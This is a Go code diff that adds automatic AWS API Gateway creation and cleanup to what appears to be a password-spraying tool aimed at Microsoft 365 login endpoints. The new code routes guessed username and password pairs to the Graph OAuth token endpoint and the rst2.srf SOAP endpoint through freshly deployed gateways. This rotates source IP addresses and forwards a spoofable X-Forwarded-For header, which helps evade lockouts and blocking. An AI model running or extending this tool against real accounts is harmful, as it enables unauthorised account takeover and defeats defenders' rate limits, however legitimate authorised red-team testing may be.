@@ -18,13 +18,19 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
-	"io/ioutil"
+	"io"
+	"log"
 	"math/rand"
 	"net/http"
 	"os"
 	"strings"
 	"time"
 
+	"github.com/aws/aws-sdk-go/aws"
+	"github.com/aws/aws-sdk-go/aws/awserr"
+	"github.com/aws/aws-sdk-go/aws/credentials"
+	"github.com/aws/aws-sdk-go/aws/session"
+	"github.com/aws/aws-sdk-go/service/apigateway"
 	"github.com/beevik/etree"
 	"github.com/fatih/color"
 	"golang.org/x/net/proxy"
@@ -96,6 +102,12 @@ const (
                                 : Highly recommended that you use this option. Google it, or
                                 : check this out: https://bigb0sss.github.io/posts/redteam-rotate-ip-aws-gateway/
                                 : (-url https://notrealgetyourown.execute-api.us-east-2.amazonaws.com/login)
+    -ak <string>                AWS Access Key
+                                : Used for automatic API gateway deployment
+    -sk <string>                AWS Secret Key
+                                : Used for automatic API gateway deployment.
+    -cleanup                    Cleanup AWS gateways
+                                : Cleans up automatically deployed AWS gateways. -ak and -sk are required for this flag.
     -debug                      Debug mode.
                                 : Print xml response
  Examples:
@@ -166,6 +178,191 @@ func randomProxy(proxies []string) string {
 
 }
 
+// createAWSAPIGateway creates an API Deployment to proxy the request and returns the proxy URL
+func createAPIGateway(accessKey, secretKey, targetUrl string) (string, error) {
+	var region = "us-east-1"
+	var endpointName = "proxy"
+	var proxyUrl string
+
+	creds := credentials.NewStaticCredentials(accessKey, secretKey, "")
+	sess, err := session.NewSession(&aws.Config{
+		Region:      aws.String(region),
+		Credentials: creds,
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	svc := apigateway.New(sess)
+
+	restApi, err := svc.CreateRestApi(&apigateway.CreateRestApiInput{
+		EndpointConfiguration: &apigateway.EndpointConfiguration{
+			Types: aws.StringSlice([]string{"REGIONAL"}),
+		},
+		Name: aws.String(endpointName),
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	getResource, err := svc.GetResource(&apigateway.GetResourceInput{
+		ResourceId: restApi.RootResourceId,
+		RestApiId:  restApi.Id,
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	createdResource, err := svc.CreateResource(&apigateway.CreateResourceInput{
+		ParentId:  getResource.Id,
+		PathPart:  aws.String("{proxy+}"),
+		RestApiId: restApi.Id,
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	_, err = svc.PutMethod(&apigateway.PutMethodInput{
+		AuthorizationType: aws.String("NONE"),
+		HttpMethod:        aws.String("ANY"),
+		RequestModels:     map[string]*string{},
+		RequestParameters: aws.BoolMap(map[string]bool{
+			"method.request.path.proxy":                  true,
+			"method.request.header.X-My-X-Forwarded-For": true,
+		}),
+		ResourceId: getResource.Id,
+		RestApiId:  restApi.Id,
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	_, err = svc.PutIntegration(&apigateway.PutIntegrationInput{
+		ConnectionType:        aws.String("INTERNET"),
+		HttpMethod:            aws.String("ANY"),
+		IntegrationHttpMethod: aws.String("ANY"),
+		RequestParameters: aws.StringMap(map[string]string{
+			"integration.request.path.proxy":             "method.request.path.proxy",
+			"integration.request.header.X-Forwarded-For": "method.request.header.X-My-X-Forwarded-For",
+		}),
+		ResourceId: getResource.Id,
+		RestApiId:  restApi.Id,
+		Type:       aws.String("HTTP_PROXY"),
+		Uri:        aws.String(targetUrl),
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	_, err = svc.PutMethod(&apigateway.PutMethodInput{
+		AuthorizationType: aws.String("NONE"),
+		HttpMethod:        aws.String("ANY"),
+		RequestModels:     map[string]*string{},
+		RequestParameters: aws.BoolMap(map[string]bool{
+			"method.request.path.proxy":                  true,
+			"method.request.header.X-My-X-Forwarded-For": true,
+		}),
+		ResourceId: createdResource.Id,
+		RestApiId:  restApi.Id,
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	_, err = svc.PutIntegration(&apigateway.PutIntegrationInput{
+		ConnectionType:        aws.String("INTERNET"),
+		HttpMethod:            aws.String("ANY"),
+		IntegrationHttpMethod: aws.String("ANY"),
+		RequestParameters: aws.StringMap(map[string]string{
+			"integration.request.path.proxy":             "method.request.path.proxy",
+			"integration.request.header.X-Forwarded-For": "method.request.header.X-My-X-Forwarded-For",
+		}),
+		ResourceId: createdResource.Id,
+		RestApiId:  restApi.Id,
+		Type:       aws.String("HTTP_PROXY"),
+		Uri:        &targetUrl,
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	_, err = svc.CreateDeployment(&apigateway.CreateDeploymentInput{
+		RestApiId: restApi.Id,
+		StageName: aws.String(endpointName),
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	_, err = svc.CreateUsagePlan(&apigateway.CreateUsagePlanInput{
+		ApiStages: []*apigateway.ApiStage{
+			{
+				ApiId: restApi.Id,
+				Stage: aws.String(endpointName),
+			},
+		},
+		Description: restApi.Id,
+		Name:        aws.String(endpointName),
+	})
+	if err != nil {
+		return proxyUrl, err
+	}
+
+	proxyUrl = fmt.Sprintf("https://%s.execute-api.%s.amazonaws.com:443/%s", *restApi.Id, region, endpointName)
+	fmt.Println("[i] AWS Gateway created:", proxyUrl)
+	fmt.Println("[i] Remember to delete gateway using -cleanup flag!")
+	return proxyUrl, nil
+}
+
+// cleanUpAWSAPIGateways cleans up unused AWS gateways, due to AWS rate limiting, this function will loop until all
+// the created API endpoints are deleted, sleeping for 10 seconds when the rate limit is hit
+func cleanUpAWSAPIGateways(accessKey, secretKey string) error {
+	var region = "us-east-1"
+	var endpointName = "proxy"
+	creds := credentials.NewStaticCredentials(accessKey, secretKey, "")
+	sess, err := session.NewSession(&aws.Config{
+		Region:      aws.String(region),
+		Credentials: creds,
+	})
+	if err != nil {
+		return err
+	}
+
+Retry:
+	svc := apigateway.New(sess, &aws.Config{
+		Region: aws.String(region),
+	})
+	restApi, err := svc.GetRestApis(&apigateway.GetRestApisInput{})
+	if err != nil {
+		return err
+	}
+
+	for _, x := range restApi.Items {
+		if *x.Name == endpointName {
+			log.Printf("[-] Deleting API \"%s\", with ID \"%s\"", *x.Name, *x.Id)
+			_, err := svc.DeleteRestApi(&apigateway.DeleteRestApiInput{
+				RestApiId: x.Id,
+			})
+
+			if err != nil {
+				if awsErr, ok := err.(awserr.Error); ok {
+					if awsErr.Code() == "TooManyRequestsException" {
+						log.Printf("[!] API Throttled in region %s sleeping for 10 seconds...\n", region)
+						time.Sleep(10 * time.Second)
+						goto Retry
+					} else {
+						return err
+					}
+				}
+			}
+
+		}
+
+	}
+
+	return nil
+}
+
 type flagVars struct {
 	flagHelp          bool
 	flagEndpoint      string
@@ -175,6 +372,8 @@ type flagVars struct {
 	flagPassword      string
 	flagPasswordFile  string
 	flagUserPassFile  string
+	flagAccessKey     string
+	flagSecretKey     string
 	flagDelay         int
 	flagWaitTime      int
 	flagProxy         string
@@ -182,6 +381,7 @@ type flagVars struct {
 	flagOutFilePath   string
 	flagAWSGatewayURL string
 	flagDebug         bool
+	flagCleanup       bool
 }
 
 func flagOptions() *flagVars {
@@ -193,6 +393,8 @@ func flagOptions() *flagVars {
 	flagPassword := flag.String("p", "", "")
 	flagPasswordFile := flag.String("pl", "", "")
 	flagUserPassFile := flag.String("up", "", "")
+	flagAccessKey := flag.String("ak", "", "")
+	flagSecretKey := flag.String("sk", "", "")
 	flagDelay := flag.Int("delay", 3600, "")
 	flagWaitTime := flag.Int("w", 1, "")
 	flagProxy := flag.String("proxy", "", "")
@@ -200,6 +402,7 @@ func flagOptions() *flagVars {
 	flagProxyFile := flag.String("proxyfile", "", "")
 	flagAWSGatewayURL := flag.String("url", "", "")
 	flagDebug := flag.Bool("debug", false, "")
+	flagCleanup := flag.Bool("cleanup", false, "")
 	flag.Parse()
 	return &flagVars{
 		flagHelp:          *flagHelp,
@@ -210,6 +413,8 @@ func flagOptions() *flagVars {
 		flagPassword:      *flagPassword,
 		flagPasswordFile:  *flagPasswordFile,
 		flagUserPassFile:  *flagUserPassFile,
+		flagAccessKey:     *flagAccessKey,
+		flagSecretKey:     *flagSecretKey,
 		flagDelay:         *flagDelay,
 		flagWaitTime:      *flagWaitTime,
 		flagProxy:         *flagProxy,
@@ -217,55 +422,79 @@ func flagOptions() *flagVars {
 		flagOutFilePath:   *flagOutFilePath,
 		flagAWSGatewayURL: *flagAWSGatewayURL,
 		flagDebug:         *flagDebug,
+		flagCleanup:       *flagCleanup,
 	}
 }
 
-func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute) {
+func doTheStuffGraph(un string, pw string, prox string, autoAws bool) (string, color.Attribute) {
 	var returnString string
 	var returnColor color.Attribute
-	client := &http.Client{}
 	// Devs - uncomment this code if you want to skip cert validation (burp+proxifier)
 	//client := &http.Client{
 	//	Transport: &http.Transport{
 	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
 	//	},
 	//}
-
-	requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
-	// If a proxy was set, do this stuff
-	if prox != "" {
-		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
+	var body []byte
+	if autoAws {
+		requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
+		request, err := http.NewRequest("POST", prox, strings.NewReader(requestBody))
 		if err != nil {
-			fmt.Println("Error connecting to proxy.")
-			os.Exit(1)
+			log.Println("Error creating request:", err)
 		}
-		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
-		client = &http.Client{
-			Transport: tr,
-			Timeout:   5 * time.Second,
+		request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
+
+		resp, err := http.Post(prox, "text/html", request.Body)
+		if err != nil {
+			log.Println(err)
+		}
+		defer resp.Body.Close()
+
+		// Read and print the response body
+		body, err = io.ReadAll(resp.Body)
+		if err != nil {
+			log.Println("Error reading response body:", err)
+		}
+
+	} else {
+		client := &http.Client{}
+		requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
+		// If a proxy was set, do this stuff
+		if prox != "" {
+			dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
+			if err != nil {
+				fmt.Println("Error connecting to proxy.")
+				os.Exit(1)
+			}
+			tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
+			client = &http.Client{
+				Transport: tr,
+				Timeout:   5 * time.Second,
+			}
+		}
+		// Build http request
+		request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
+		request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
+		if err != nil {
+			panic(err)
+		}
+		// Send http request
+		response, err := client.Do(request)
+		if err != nil {
+			color.Set(color.FgRed)
+			fmt.Println("[!] Could not connect to microsoftonline.com\n")
+			fmt.Println("[!] Debug info below:")
+			color.Unset()
+			panic(err)
+		}
+		defer response.Body.Close()
+		// Read response
+		body, err = io.ReadAll(response.Body)
+		if err != nil {
+			print(err)
 		}
 	}
-	// Build http request
-	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
-	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
-	if err != nil {
-		panic(err)
-	}
-	// Send http request
-	response, err := client.Do(request)
-	if err != nil {
-		color.Set(color.FgRed)
-		fmt.Println("[!] Could not connect to microsoftonline.com\n")
-		fmt.Println("[!] Debug info below:")
-		color.Unset()
-		panic(err)
-	}
-	defer response.Body.Close()
-	// Read response
-	body, err := ioutil.ReadAll(response.Body)
-	if err != nil {
-		print(err)
-	}
+
 	var data map[string]interface{}
 	if err := json.Unmarshal([]byte(body), &data); err != nil {
 		panic(err)
@@ -313,11 +542,10 @@ func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute
 	return returnString, returnColor
 }
 
-func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) {
+func doTheStuffRst(un string, pw string, prox string, autoAws bool) (string, color.Attribute) {
 	var returnString string
 	var returnColor color.Attribute
 	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + un + `</wsse:Username><wsse:Password>` + pw + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
-	client := &http.Client{}
 	// Devs - uncomment this code if you want to skip cert validation (burp+proxifier)
 	//client := &http.Client{
 	//	Transport: &http.Transport{
@@ -325,40 +553,65 @@ func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) 
 	//	},
 	//}
 
-	// Build http request
-	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
-	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
-	if err != nil {
-		panic(err)
-	}
-	// Set proxy if enabled
-	if prox != "" {
-		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
+	var body []byte
+	// AWS endpoint uses standard HTTP connection instead of SOCKS5
+	if autoAws {
+		request, err := http.NewRequest("POST", prox, strings.NewReader(requestBody))
 		if err != nil {
-			fmt.Println("Error connecting to proxy.")
-			os.Exit(1)
+			log.Println("Error creating request:", err)
 		}
-		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
-		client = &http.Client{
-			Transport: tr,
-			Timeout:   5 * time.Second, //set to 15 when done
+		request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582")
+
+		resp, err := http.Post(prox, "application/xml", request.Body)
+		if err != nil {
+			log.Println(err)
+		}
+		defer resp.Body.Close()
+
+		// Read and print the response body
+		body, err = io.ReadAll(resp.Body)
+		if err != nil {
+			log.Println("Error reading response body:", err)
+		}
+	} else {
+		// Build http request
+		request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
+		request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
+		if err != nil {
+			panic(err)
+		}
+
+		client := &http.Client{}
+		// Set proxy if enabled
+		if prox != "" {
+			dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
+			if err != nil {
+				fmt.Println("Error connecting to proxy.")
+				os.Exit(1)
+			}
+			tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
+			client = &http.Client{
+				Transport: tr,
+				Timeout:   5 * time.Second, //set to 15 when done
+			}
+		}
+		// Send http request
+		response, err := client.Do(request)
+		if err != nil {
+			color.Set(color.FgRed)
+			fmt.Println("[!] Could not connect to microsoftonline.com. Check your comms.\n")
+			fmt.Println("[!] Debug info below:")
+			color.Unset()
+			panic(err)
+		}
+		defer response.Body.Close()
+		// Read response
+		body, err = io.ReadAll(response.Body)
+		if err != nil {
+			print(err)
 		}
 	}
-	//Send http request
-	response, err := client.Do(request)
-	if err != nil {
-		color.Set(color.FgRed)
-		fmt.Println("[!] Could not connect to microsoftonline.com. Check your comms.\n")
-		fmt.Println("[!] Debug info below:")
-		color.Unset()
-		panic(err)
-	}
-	defer response.Body.Close()
-	// Read response
-	body, err := ioutil.ReadAll(response.Body)
-	if err != nil {
-		print(err)
-	}
+
 	// Parse response
 	xmlResponse := etree.NewDocument()
 	xmlResponse.ReadFromBytes(body)
@@ -424,6 +677,28 @@ func main() {
 		fmt.Printf("%s\n", usage)
 		os.Exit(0)
 	}
+	// -ak -sk
+	var autoAWS = false
+	if opt.flagAccessKey != "" && opt.flagSecretKey != "" {
+		fmt.Println(color.CyanString("[i] Automatic AWS gateway configured"))
+
+		if opt.flagCleanup {
+			err := cleanUpAWSAPIGateways(opt.flagAccessKey, opt.flagSecretKey)
+			if err != nil {
+				panic(err)
+			}
+			fmt.Println(color.GreenString("[i] Cleanup complete!\n"))
+			os.Exit(0)
+		}
+		if opt.flagAWSGatewayURL != "" {
+			fmt.Println(color.RedString("[!] Cannot provide AWS Gateway URL as well as AWS credentials, the gateway is created automatically!\n"))
+			os.Exit(0)
+		} else {
+			autoAWS = true
+		}
+
+	}
+
 	// -u
 	if opt.flagUsername != "" {
 		usernameList = append(usernameList, opt.flagUsername)
@@ -529,6 +804,7 @@ func main() {
 		}
 		fmt.Println(color.CyanString("[i] Optional proxy file configured: " + opt.flagProxyFile))
 	}
+
 	// -o
 	if opt.flagOutFilePath != "" {
 		outFile, err = os.OpenFile(opt.flagOutFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -558,12 +834,19 @@ func main() {
 	}
 
 	// -endpoint
+	var proxyUrl string
 	if opt.flagEndpoint == "rst" {
 		color.Set(color.FgCyan)
 		fmt.Println("[i] Using the rst endpoint...")
 		if opt.flagAWSGatewayURL != "" {
 			fmt.Println("[i] Make sure your AWS Gateway (for the -url setting) is pointing to https://login.microsoftonline.com/rst2.srf")
 			targetURL = opt.flagAWSGatewayURL
+		} else if autoAWS {
+			proxyUrl, err = createAPIGateway(opt.flagAccessKey, opt.flagSecretKey, targetURLrst2)
+			if err != nil {
+				panic(err)
+			}
+			targetURL = proxyUrl
 		} else {
 			targetURL = targetURLrst2
 		}
@@ -574,6 +857,12 @@ func main() {
 		if opt.flagAWSGatewayURL != "" {
 			fmt.Println("[i] Make sure the your AWS Gateway (for the -url setting) is pointing to https://login.microsoft.com/common/oauth2/token ")
 			targetURL = opt.flagAWSGatewayURL
+		} else if autoAWS {
+			proxyUrl, err = createAPIGateway(opt.flagAccessKey, opt.flagSecretKey, targetURLgraph)
+			if err != nil {
+				panic(err)
+			}
+			targetURL = proxyUrl
 		} else {
 			targetURL = targetURLgraph
 		}
@@ -602,18 +891,22 @@ func main() {
 
 			if opt.flagEndpoint == "rst" {
 				proxyInput := ""
-				if opt.flagProxyFile != "" {
-					proxyInput := "bp"
-					for {
-						proxyInput = randomProxy(proxyList)
-						if proxyInput == "bp" {
+				if autoAWS {
+					proxyInput = proxyUrl
+				} else {
+					if opt.flagProxyFile != "" {
+						proxyInput := "bp"
+						for {
 							proxyInput = randomProxy(proxyList)
-						} else {
-							break
+							if proxyInput == "bp" {
+								proxyInput = randomProxy(proxyList)
+							} else {
+								break
+							}
 						}
 					}
 				}
-				result, col := doTheStuffRst(user, pass, proxyInput)
+				result, col := doTheStuffRst(user, pass, proxyInput, autoAWS)
 				color.Set(col)
 				fmt.Println(result)
 				color.Unset()
@@ -628,18 +921,24 @@ func main() {
 
 			} else if opt.flagEndpoint == "graph" {
 				proxyInput := ""
-				if opt.flagProxyFile != "" {
-					proxyInput := "bp"
-					for {
-						proxyInput = randomProxy(proxyList)
-						if proxyInput == "bp" {
+
+				if autoAWS {
+					proxyInput = proxyUrl
+				} else {
+					if opt.flagProxyFile != "" {
+						proxyInput := "bp"
+						for {
 							proxyInput = randomProxy(proxyList)
-						} else {
-							break
+							if proxyInput == "bp" {
+								proxyInput = randomProxy(proxyList)
+							} else {
+								break
+							}
 						}
 					}
 				}
-				result, col := doTheStuffGraph(user, pass, proxyInput)
+
+				result, col := doTheStuffGraph(user, pass, proxyInput, autoAWS)
 				color.Set(col)
 				fmt.Println(result)
 				color.Unset()
